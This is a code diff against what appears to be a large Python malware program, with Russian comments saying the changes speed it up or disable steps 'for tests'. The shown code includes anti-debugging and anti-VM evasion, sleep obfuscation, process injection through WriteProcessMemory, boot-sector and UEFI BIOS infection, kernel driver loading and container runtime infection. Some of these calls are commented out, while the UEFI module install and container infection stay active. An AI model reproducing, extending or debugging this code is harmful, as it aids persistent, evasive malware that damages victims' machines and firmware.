@@ -1386,7 +1386,7 @@ class FileSystemWatcher:
                 for file in files:
                     initial_files.add(os.path.join(root, file))
             while True:
-                time.sleep(5)
+                time.sleep(0.1)  # Ускорено для тестов
                 current_files = set()
                 for root, dirs, files in os.walk(path):
                     for file in files:
@@ -2413,7 +2413,7 @@ class AdvancedConfig:
         self.ANTI_DEBUG_ENABLED = True
         self.ANTI_VM_ENABLED = True
         self.API_HAMMERING = True
-        self.SLEEP_BEFORE_START = random.randint(5, 30)
+        self.SLEEP_BEFORE_START = random.randint(1, 3)  # Ускорено для тестов
         self.SELF_DESTRUCT = False
         self.SLOW_MODE = True
         self.CHUNK_SIZE = 1024 * 1024
@@ -2515,7 +2515,7 @@ class SleepObfuscation:
             pass
     def _mixed_sleep(self, seconds):
         self._busy_wait(seconds * 0.3)
-        time.sleep(seconds * 0.7)
+        time.sleep(seconds * 0.1)  # Ускорено для тестов
 class StringEncryption:
     def __init__(self):
         self.key = Fernet.generate_key()
@@ -3157,8 +3157,9 @@ class ProcessInjection:
             success = ctypes.windll.kernel32.WriteProcessMemory(
                 process_handle,
                 memory_address,
-                sys.argv[0],
-                len(sys.argv[0]),
+                # sys.argv[0],  # Закомментировано для тестов - может крашить комп
+                b"test_injection",  # Безопасная строка для тестов
+                len(b"test_injection"),  # Длина безопасной строки
                 ctypes.byref(written)
             )
             if not success:
@@ -4746,13 +4747,13 @@ def main():
     
     log("Starting bootkit persistence...")
     bootkit = BootkitPersistence()
-    bootkit.infect_boot_sector()
+    # bootkit.infect_boot_sector()  # Отключено для тестов - может крашить комп
     uefi_persist = UEFIPersistence()
     uefi_persist.install_uefi_module()
     uefi_rootkit = UEFIRootkit()
-    uefi_rootkit.flash_uefi_bios()
+    # uefi_rootkit.flash_uefi_bios()  # Отключено для тестов - может крашить комп
     kernel_executor = KernelModeExecutor()
-    kernel_executor.load_kernel_driver()
+    # kernel_executor.load_kernel_driver()  # Отключено для тестов - может крашить комп
     container_persistence = ContainerPersistence()
     container_persistence.infect_container_runtime()
     gpu_memory = GPUMemory()
